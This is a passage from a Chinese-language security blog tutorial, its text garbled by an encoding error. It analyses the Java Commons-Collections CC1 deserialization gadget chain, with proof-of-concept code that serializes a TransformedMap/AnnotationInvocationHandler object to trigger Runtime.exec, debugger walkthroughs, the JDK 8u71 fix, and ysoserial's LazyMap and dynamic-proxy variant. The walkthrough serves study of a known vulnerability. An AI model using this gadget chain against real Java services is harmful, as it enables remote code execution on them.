&quot;xxxx&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// å› ä¸ºAnnotationInvocationHandleråªæœ‰ä¸ªç§æœ‰çš„æœ‰å‚æ„é€ ï¼Œæ‰€ä»¥éœ€è¦getDeclaredConstructorè·å–</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//è®¾ç½®æ‰€æœ‰çš„æˆå‘˜éƒ½å¯ä»¥è®¿é—®</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// è·å–å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªAnnotationç±»; ç¬¬äºŒä¸ªæ˜¯å‚æ•°å°±æ˜¯å‰é¢æ„é€ çš„Mapã€‚</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†ä¸Šè¿°è¿‡ç¨‹åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./exp.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿç›®æ ‡åç«¯ç¨‹åºæ¥å—åˆ°çš„åºåˆ—åŒ–åçš„æ•°æ®</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./exp.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†<code>Runtime.getRuntime()</code>æ¢æˆ<code>Runtime.class</code>ï¼Œå‰è€…æ˜¯ä¸€ä¸ª<code>java.lang.Runtime</code>å¯¹è±¡ï¼Œåè€…æ˜¯ä¸€ä¸ª<code>java.lang.Class </code>å¯¹è±¡ã€‚Classç±»æœ‰å®ç°Serializableæ¥å£ï¼Œæ‰€ä»¥å¯ä»¥è¢«åºåˆ—åŒ–,ä¹‹ååˆ©ç”¨åå°„çš„çŸ¥è¯†å’ŒInvokerTransformerå®ç°çš„<code>transform</code>æ–¹æ³•çš„ç‰¹æ€§è·å–<code>getRuntime</code>æ–¹æ³•å¹¶æ‰§è¡Œã€‚</p>
<p>æ”¹é€ å®Œæˆåæ‰§è¡Œï¼Œæˆ‘ä»¬å‘ç°è™½ç„¶æ²¡æœ‰äº†é”™è¯¯ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æ‰§è¡Œå‘½ä»¤ã€‚æŒ‰ç†è¯´æˆ‘ä»¬çš„é€»è¾‘æ˜¯é€šçš„ï¼š</p>
<ol>
<li><strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>çš„<strong>readObject</strong>ä¼šè°ƒç”¨æˆ‘ä»¬ä¼ å…¥mapçš„setValueæ–¹æ³•ï¼Œæ”¹å˜ map ä¸­çš„valueçš„å€¼;</li>
<li>å½“ map ä¸­çš„ value çš„å€¼å‘ç”Ÿæ”¹å˜æ—¶ä¼šè°ƒç”¨å¯¹åº”çš„<strong>transform</strong>æ–¹æ³•,è¿™é‡Œæ˜¯ChainedTransformerçš„<strong>transform</strong>æ–¹æ³•;</li>
<li>ChainedTransformerçš„<strong>transform</strong>æ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ªTransformerç±»å‹çš„æ•°ç»„ï¼Œç„¶åéå†æ‰§è¡Œæ•°ç»„ä¸­å…ƒç´ çš„<strong>transform</strong>æ–¹æ³•ï¼Œå¹¶ä¸”å°†ä¸Šä¸ªå…ƒç´ çš„è¿”å›ç»“æœä½œä¸ºä¸‹ä¸ªå…ƒç´ æ‰§è¡Œ<strong>transform</strong>æ–¹æ³•çš„å‚æ•°;</li>
<li>ç„¶åæˆ‘ä»¬åˆ©ç”¨äº†ConstantTransformerå’ŒInvokerTransformerç²¾å¿ƒæ„é€ äº†ä¸€ä¸ª**Transformer[]**æ•°ç»„æ¥æ‰§è¡Œå‘½ä»¤</li>
</ol>
<p>åœ¨åŠ å…¥<code>AnnotationInvocationHandler</code>ä¹‹å‰éƒ½æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥é—®é¢˜å¯èƒ½å‡ºåœ¨äº†<strong>AnnotationInvocationHandler</strong>çš„<strong>readObject</strong>æ–¹æ³•ï¼Œæ¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œç›´æ¥åœ¨<strong>AnnotationInvocationHandler#readObject</strong>è¿™é‡Œä¸‹æ–­ç‚¹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214106.png" alt="image-20210610171645781"></p>
<p>è°ƒè¯•ä¸­å‘ç°ï¼Œå®ƒåœ¨355è¡Œæ‰§è¡Œå®Œåï¼Œç›´æ¥åˆ°æœ€åè¡Œæœ«äº†ï¼Œ<code>var5.setValue</code>æ ¹æœ¬å°±æ²¡æœ‰æ‰§è¡Œçš„æœºä¼šï¼Œåœ¨å³ä¸‹è§’çš„å‚æ•°å€¼é‡Œé¢å¯ä»¥çœ‹åˆ° <code>this.memberValues</code>é‡Œæ ¹æœ¬å°±æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥ä¸ä¼šå‘ä¸‹æ‰§è¡Œã€‚</p>
<p>çœ‹äº†ä¸€ä¸‹Pç‰›çš„ä»£ç ï¼Œå‘ç°åœ¨HashMapå®ä¾‹åŒ–åï¼Œæ·»åŠ äº†ä¸€ä¸ªæ•°æ®<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214115.png" alt="image-20210610173610117">ç„¶åå°±å¯ä»¥æ‰§è¡Œäº†ï¼Œå†æ¬¡debugï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œå®Œç¬¬ä¸€å¥<code>var1.defaultReadObject();</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214122.png" alt="image-20210610173926189"></p>
<p><code>this.memberValues</code>å°±ä¸ä¸ºé›¶äº†ï¼Œç„¶åç»è¿‡æµ‹è¯•å‘ç°<code>innerMap.put(&quot;value&quot;, &quot;yhy&quot;);</code> åªæœ‰æ·»åŠ çš„keyçš„å€¼ä¸º<strong>value</strong>æ‰å¯ä»¥è§¦å‘ï¼Œåªæœ‰å½“keyä¸º<code>value</code>æ—¶<code>var7 != null</code>æ‰ä¼šæˆç«‹ï¼Œè¿™ç‚¹Pç‰›ç»™å‡ºçš„ç­”æ¡ˆæ˜¯ï¼š</p>
<blockquote>
<p>é‚£ä¹ˆå¦‚ä½•è®©è¿™ä¸ªvar7ä¸ä¸ºnullå‘¢?è¿™ä¸€å—æˆ‘å°±ä¸è¯¦ç»†åˆ†æäº†ï¼Œè¿˜ä¼šæ¶‰åŠåˆ°Javaæ³¨é‡Š(ps:è¿™é‡Œåº”è¯¥æ˜¯æ³¨è§£)ç›¸å…³çš„æŠ€æœ¯ã€‚ç›´æ¥ç»™å‡ºä¸¤ä¸ªæ¡ä»¶:</p>
<ol>
<li><p>sun.reflect.annotation.AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åæ˜¯X</p>
</li>
<li><p>è¢«TransformedMap.decorateä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´ </p>
</li>
</ol>
<p>æ‰€ä»¥ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘å‰é¢ç”¨åˆ° Retention.class ï¼Œå› ä¸ºRetentionæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œåä¸ºvalue;æ‰€ ä»¥ï¼Œä¸ºäº†å†æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œæˆ‘éœ€è¦ç»™Mapä¸­æ”¾å…¥ä¸€ä¸ªKeyæ˜¯valueçš„å…ƒç´ :</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214135.png" alt="image-20210610174833432"></p>
<p>Pç‰›è¯´çš„ç¬¬ä¸€ç‚¹åº”è¯¥æ˜¯è¿™é‡Œï¼Œ<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>çš„æ„é€ æ–¹æ³•é‡Œç¡®å®æ˜¯è¿™æ ·è¦æ±‚çš„ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åªèƒ½ä¸ºæ³¨è§£ç±»å‹ï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214140.png" alt="image-20210610185739244"></p>
<p>ä¸ºä»€ä¹ˆè¦æœ‰ä¸€ä¸ªæ–¹æ³•å‘¢ï¼Ÿ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214144.png" alt="image-20210610210327715"></p>
<p>è¿™é‡Œçš„ var7 æ˜¯ç»è¿‡ä¼ å…¥çš„æ³¨è§£ç±»å®ä¾‹åŒ–æ‰§è¡Œ<code>memberTypes()</code>ç»è¿‡ä¸‹é¢çš„è½¬åŒ–è¿‡ç¨‹ï¼Œè¿”å›mapï¼Œå¾—åˆ°var3ï¼Œè½¬åŒ–è¿‡ç¨‹å¯ä»¥debugçœ‹çœ‹ï¼Œå½“æ³¨è§£ç±»å­˜åœ¨æ–¹æ³•æ—¶ä¼šè¿”å›æœ€ä¸‹æ–¹æ¡†çš„ä¸€ä¸ªmapé›†åˆï¼Œè¿™æ—¶<code>(Class)var3.get(var6);</code>æ‰ä¼šå­˜åœ¨å€¼ï¼Œå³<code>var7 != null</code>ã€‚(å­˜åœ¨æ–¹æ³•çš„æ³¨è§£ç±»æœ‰ä¸¤ä¸ª<code>Retention</code>å’Œ<code>Target</code>ï¼Œè¿™ä¸¤ä¸ªä¼ å…¥å“ªä¸ªéƒ½å¯ä»¥)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214150.png" alt="image-20210610211055963"></p>
<p>ä¸‹é¢æ‰¾äº†ä¸€ä¸ªä¸å­˜åœ¨æ–¹æ³•çš„æ³¨è§£ç±»<code>Documented</code>è¿›è¡Œå¯¹æ¯”ï¼Œä¼šå‘ç°æœ€ç»ˆè¿”å›æ—¶æ ¹æœ¬æ²¡æœ‰å€¼ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214154.png" alt="image-20210610212059476"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214200.png" alt="image-20210610211721560"></p>
<p>ç¬¬äºŒç‚¹ä¼šå¥½ç†è§£ç‚¹ï¼šä¹‹å‰è¯´è¿‡ï¼Œä¿®æ”¹ map ä¸­çš„keyæˆ–è€…valueæ—¶ä¼šè‡ªåŠ¨è§¦å‘æˆ‘ä»¬è‡ªå®šä¹‰çš„<code>transform</code>æ–¹æ³•ï¼Œå› ä¸º<code>Retention</code>æ³¨è§£ä¸­çš„æ–¹æ³•åä¸º<strong>value</strong>ï¼Œåœ¨ä¸Šé¢è½¬æ¢ä¸­ï¼Œå°†æ­¤æ–¹æ³•åæ”¾å…¥äº†è½¬æ¢å map çš„ keyä¸­ï¼Œæ‰€ä»¥æƒ³è¦æ”¹åŠ¨mapä¸­çš„valueï¼Œå¿…é¡»ä½¿ç”¨ç›¸åŒçš„keyå€¼å³<strong>value</strong>ã€‚</p>
<blockquote>
<p>  è¿™ç‚¹é…åˆå‚è€ƒä¸­çš„ï¼š<a href="https://xz.aliyun.com/t/7031#toc-7%E9%A3%9F%E7%94%A8%E6%9B%B4%E4%BD%B3%EF%BC%8C%E4%BD%9C%E8%80%85%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%BF%B0%E4%BA%86%E6%B3%A8%E8%A7%A3">https://xz.aliyun.com/t/7031#toc-7é£Ÿç”¨æ›´ä½³ï¼Œä½œè€…è¯¦ç»†è®²è¿°äº†æ³¨è§£</a></p>
</blockquote>
<p>è‡³æ­¤ï¼Œç»è¿‡Pç‰›ç®€åŒ–åçš„<strong>åˆ©ç”¨é“¾</strong>ï¼Œå·²ç»å¤§è‡´æ¸…æ™°ï¼Œå¹¶ä¸”å¯ä»¥ç”¨ä»¥å®æˆ˜ï¼Œä½†æ˜¯ä¸Šè¿°ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®åªèƒ½åœ¨<strong>Java 8u71</strong>ä¹‹å‰ä½¿ç”¨ï¼Œåœ¨8u71ä»¥åå¤§æ¦‚æ˜¯2015å¹´12æœˆçš„æ—¶å€™ï¼ŒJava å®˜æ–¹ä¿®æ”¹äº† <code>sun.reflect.annotation.AnnotationInvocationHandler</code> çš„<code>readObject</code>å‡½æ•°:<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p>
<p>ä¿®æ”¹jdkç‰ˆæœ¬ï¼Œé‡æ–°è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰æ‰§è¡Œå‘½ä»¤<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214205.png" alt="image-20210610213815088"></p>
<p>æ”¹åŠ¨åçš„<strong>readObject</strong>å‡½æ•°ä¸å†æœ‰é’ˆå¯¹æˆ‘ä»¬æ„é€ çš„mapçš„èµ‹å€¼è¯­å¥ï¼Œæ‰€ä»¥è§¦å‘ä¸äº†æ¼æ´ã€‚è€Œæ˜¯æ”¹æˆäº†æ–°å»ºä¸€ä¸ªLinkedHashMapï¼ŒæŠŠå€¼è½¬è¿›è¿™ä¸ªLinkedHashMapé‡Œé¢ã€‚</p>
<p>æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„ LinkedHashMap å¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§ è¡Œsetæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110500.png" alt="image-20210610215539317"></p>
<h2 id="0x05-ysoserialé¡¹ç›®ä¸­çš„CC1é“¾"><a href="#0x05-ysoserialé¡¹ç›®ä¸­çš„CC1é“¾" class="headerlink" title="0x05 ysoserialé¡¹ç›®ä¸­çš„CC1é“¾"></a>0x05 ysoserialé¡¹ç›®ä¸­çš„CC1é“¾</h2><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾ä¸­å¹¶æ²¡æœ‰ä¹‹å‰åˆ†æçš„ä¸€ä¸ªå…³é”®ç‚¹<strong>TransformedMap</strong>ï¼Œè€Œæ˜¯å˜æˆäº†<strong>LazyMap</strong>ï¼Œè¿™å°±å¯¼è‡´äº†ä¹‹åçš„åˆ©ç”¨é“¾å®Œå…¨ä¸åŒ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Requires:</span></span><br><span class="line"><span class="comment">      commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110455.png" alt="image-20210611074945777"></p>
<h3 id="5-1-ysoserialä¸­çš„LazyMap"><a href="#5-1-ysoserialä¸­çš„LazyMap" class="headerlink" title="5.1 ysoserialä¸­çš„LazyMap"></a>5.1 ysoserialä¸­çš„LazyMap</h3><p>LazyMapå’ŒTransformedMapç±»ä¼¼ï¼Œéƒ½æ¥è‡ªäºCommonCollectionsåº“ï¼Œå¹¶ç»§æ‰¿è‡ªAbstractMapDecoratorã€‚</p>
<p><strong>TransformedMap</strong>æ˜¯åªè¦è°ƒç”¨decorate()å‡½æ•°ï¼Œä¼ å…¥keyå’Œvalueçš„å˜æ¢å‡½æ•°Transformerï¼Œç„¶åMapä¸­çš„ä»»æ„é¡¹çš„Keyæˆ–è€…Valueè¢«ä¿®æ”¹ï¼Œç›¸åº”çš„Transformer(keyTransformeræˆ–è€…valueTransformer)çš„<strong>transform</strong>æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚</p>
<p><strong>LazyMap</strong>æ˜¯åªè¦æ‰§è¡Œ get æ–¹æ³•å°±ä¼šè°ƒç”¨<strong>transform</strong>ï¼Œè¿™ä¸ªåˆ©ç”¨é“¾åˆ©ç”¨çš„æ ¸å¿ƒæ¡ä»¶å°±æ˜¯å»å¯»æ‰¾ä¸€ä¸ªç±»ï¼Œåœ¨å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ç²¾å¿ƒæ„é€ å¯¹è±¡çš„ LazyMap çš„getæ–¹æ³•ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110452.png" alt="image-20210611080807562"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110448.png" alt="image-20210611101901231"></p>
<p>ä½†æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Map(this.memberValues)çš„getæ–¹æ³•ã€‚</p>
<p>æ‰€ä»¥ysoserialæ‰¾åˆ°äº†å¦ä¸€æ¡è·¯ï¼Œå› ä¸ºAnnotationInvocationHandlerç±» åŒæ—¶ä¹Ÿå®ç°äº†<code>InvocationHandler</code>æ¥å£ï¼ˆåŠ¨æ€ä»£ç†ï¼‰ï¼Œåœ¨<code>invoke</code>æ–¹æ³•æœ‰è°ƒç”¨åˆ°get<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110445.png" alt="image-20210611081300634"></p>
<p>ä»è¿™ç‚¹å°±å¯ä»¥çœ‹å‡º<strong>LazyMap</strong>è¿™æ¡é“¾æ¯”<strong>TransformedMap</strong>è¾ƒä¸ºå¤æ‚ï¼Œåœ¨<strong>TransformedMap</strong>é‚£æ¡åˆ©ç”¨é“¾ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å°†mapå¯¹è±¡åˆ©ç”¨åå°„æ”¾å…¥<code>AnnotationInvocationHandler</code>ä¸­ï¼Œç„¶ååºåˆ—åŒ–æ•°æ®å³å¯ã€‚</p>
<p>è€Œ<strong>LazyMap</strong>è‹¥æƒ³è¦è°ƒç”¨åˆ°<code>invoke</code>è¿˜éœ€è¦ç”¨åˆ°Javaä¸­çš„åŠ¨æ€ä»£ç†ï¼Œæ¥ä¸€èµ·ç®€å•å­¦ä¹ å§ã€‚</p>
<h3 id="5-2-JavaåŠ¨æ€ä»£ç†"><a href="#5-2-JavaåŠ¨æ€ä»£ç†" class="headerlink" title="5.2 JavaåŠ¨æ€ä»£ç†"></a>5.2 JavaåŠ¨æ€ä»£ç†</h3><p>å…ˆæ¥ç†è§£ä¸‹ä»€ä¹ˆæ˜¯åŠ¨æ€ä»£ç†</p>
<blockquote>
<p>  <strong>åœ¨ä¸ä¿®æ”¹ç±»çš„æºç çš„æƒ…å†µä¸‹,é€šè¿‡ä»£ç†çš„æ–¹å¼ä¸ºç±»çš„æ–¹æ³•æä¾›æ›´å¤šçš„åŠŸèƒ½ã€‚</strong></p>
<p>  ä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼ˆè¿™ä¸ªä¾‹å­åœ¨å¼€å‘ä¸­å¾ˆå¸¸è§ï¼‰ï¼šæˆ‘çš„å¼€å‘ä»¬å®ç°äº†ä¸šåŠ¡éƒ¨åˆ†çš„æ‰€æœ‰ä»£ç ï¼Œå¿½ç„¶æˆ‘æœŸæœ›åœ¨è¿™äº›ä¸šåŠ¡ä»£ç ä¸­æ·»åŠ æ—¥å¿—è®°å½•åŠŸèƒ½çš„æ—¶å€™ï¼Œä¸€ä¸ªä¸€ä¸ªç±»å»æ·»åŠ ä»£ç å°±ä¼šéå¸¸éº»çƒ¦ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±èƒ½é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼å¯¹æœŸå¾…æ·»åŠ æ—¥å¿—çš„ç±»è¿›è¡Œä»£ç†ã€‚</p>
</blockquote>
<p>åœ¨javaçš„ java.lang.reflect åŒ…ä¸‹æä¾›äº†ä¸€ä¸ª<code>Proxy</code>ç±»å’Œä¸€ä¸ª<code>InvocationHandler</code>æ¥å£ï¼Œé€šè¿‡è¿™ä¸ªç±»å’Œè¿™ä¸ªæ¥å£å¯ä»¥ç”ŸæˆJDKåŠ¨æ€ä»£ç†ç±»å’ŒåŠ¨æ€ä»£ç†å¯¹è±¡ã€‚ </p>
<p>Pç‰›å†™äº†ä¸€ä¸ªDemoï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">// ExampleInvocationHandlerç±»å®ç°äº†invokeæ–¹æ³•ï¼Œä½œç”¨æ˜¯åœ¨ç›‘æ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯getçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²Hacked Object </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="comment">// Proxy.newProxyInstance çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ClassLoaderï¼Œæˆ‘ä»¬ç”¨é»˜è®¤çš„å³å¯;</span></span><br><span class="line">        <span class="comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦ ä»£ç†çš„å¯¹è±¡é›†åˆ;</span></span><br><span class="line">        <span class="comment">//ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“ä»£ç†çš„é€»è¾‘ã€‚</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡ŒAppï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè™½ç„¶å‘Mapæ”¾å…¥çš„helloå€¼ä¸ºworldï¼Œä½†è·å–åˆ°çš„ç»“æœå´æ˜¯ï¼š<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110439.png" alt="image-20210611083456820"></p>
<p>å½“ä¸€ä¸ªç±»å®ç°äº†<code>InvocationHandler</code>æ¥å£ï¼Œå¹¶å®ç°<code>invoke</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼å»åŠ«æŒè¯¥ç±»çš„å†…éƒ¨å‡½æ•°è°ƒç”¨ï¼Œå½“æ‰§è¡Œè¯¥ç±»çš„ä»»æ„æ–¹æ³•æ—¶éƒ½ä¼šè°ƒç”¨<code>invoke</code>æ–¹æ³•ã€‚</p>
<p>æˆ‘ä»¬å†æ¥çœ‹çœ‹<code>AnnotationInvocationHandler</code>ç±»ï¼Œå®ƒå®ç°äº†<code>InvocationHandler</code>,å¹¶ä¸”å®ç°äº†<code>invoke</code>æ–¹æ³•<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110435.png" alt="image-20210611084448243"></p>
<p>æ‰€ä»¥ysoserialé€šè¿‡åŠ¨æ€ä»£ç†åŠ«æŒäº†AnnotationInvocationHandlerçš„è°ƒç”¨</p>
<h3 id="5-3-é€šè¿‡LazyMapæ„é€ åˆ©ç”¨é“¾"><a href="#5-3-é€šè¿‡LazyMapæ„é€ åˆ©ç”¨é“¾" class="headerlink" title="5.3 é€šè¿‡LazyMapæ„é€ åˆ©ç”¨é“¾"></a>5.3 é€šè¿‡LazyMapæ„é€ åˆ©ç”¨é“¾</h3><p>å°†ä¹‹å‰ Demo ä¸­çš„ TransformedMap æ¢æˆ LazyMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br></pre></td></tr></table></figure>

